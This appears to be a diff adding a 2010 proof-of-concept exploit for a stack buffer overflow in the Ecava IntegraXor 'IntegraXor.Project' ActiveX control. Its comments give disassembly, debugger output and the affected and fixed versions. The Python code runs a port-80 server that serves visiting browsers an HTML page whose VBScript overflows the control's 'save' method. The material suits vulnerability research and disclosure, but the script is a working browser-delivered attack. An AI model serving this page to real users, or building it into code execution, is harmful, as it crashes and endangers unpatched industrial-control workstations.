@@ -1,0 +1,86 @@
+#!/usr/bin/python
+# intx.py
+# Ecava IntegraXor Remote ActiveX Buffer Overflow PoC
+# Jeremy Brown
+# December 2010
+# http://www.integraxor.com/
+#
+# There is a stack-based buffer overflow in IntegraXor that can be triggered
+# by passing an overly large value to the "save" method of the IntegraXor.Project
+# control located in igcomm.dll. This control is marked both safe for scripting
+# and safe for initialization.
+#
+# .text:100027C1                 push    eax             ; lpString2
+# .text:100027C2                 lea     eax, [esp+84Ch+String1]
+# .text:100027C6                 push    eax             ; lpString1
+# .text:100027C7                 call    ds:lstrcpyW
+# .text:100027CD                 lea     ecx, [esp+848h+String1]
+# .text:100027D1                 push    ecx
+# .text:100027D2                 call    SplitPath
+# .text:100027D7                 add     esp, 4
+# .text:100027DA                 lea     ecx, [esp+848h+var_83C]
+# .text:100027DE                 call    ds:??0?$basic_string@_WU?$char<truncated>
+# .text:100027E4                 cmp     dword ptr [esi+20h], 8
+# .text:100027E8                 jb      short loc_100027EF
+# .text:100027EA                 mov     esi, [esi+0Ch]
+# .text:100027ED                 jmp     short loc_100027F2
+#
+# The vulnerable code in this block passes String1 (dest) and lpString2 (src)
+# to lstrcpyW() without validating the length of lpString2. lstrcpyW() then
+# copies lpString2 byte for byte into String1 (1024 bytes wchar buffer) and
+# adds a terminating NULL byte to the end.
+#
+# If you attach a debugger and set a breakpoint on 100027CD, you can see an
+# exception registration record is stored before the return address:
+#
+# ESP+83C  > 00420042  B.B.  Pointer to next SEH record
+# ESP+840  > 00420042  B.B.  SE handler
+# ESP+844  > FFFF0000  ..??
+# ESP+848  > 10007916  xxxx  RETURN to igcom.10007916 from igcom.10002770
+#
+# I wasn't able to find any useable unicode compatible PPRs. We can overwrite
+# the return address, but it will exit with a c0000409 code (/GS exception). 
+#
+# Tested Ecava IntegraXor 3.5.3900.5 on Windows
+#
+# Fixed version: 3.5.3900.10
+#
+
+import sys
+import socket
+
+resp="""
+<html>
+<body>
+<object id="target" classid="clsid:{520F4CFD-61C6-4EED-8004-C26D514D3D19}"></object>
+<script language="vbscript">
+
+data="IntegraXor"
+filepath=String(1038,"B")
+
+target.save data,filepath
+
+</script>
+</body>
+</html>
+"""
+
+port=80
+
+try:
+     sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+     sock.bind(("",port))
+     sock.listen(1)
+     conn,addr=sock.accept()
+
+except IOError,e:
+     print e
+
+print "Client at %s connected\n"%addr[0]
+
+req=conn.recv(1024)
+
+print "Sending data..."
+conn.send(resp)
+print "Done"
+conn.close()
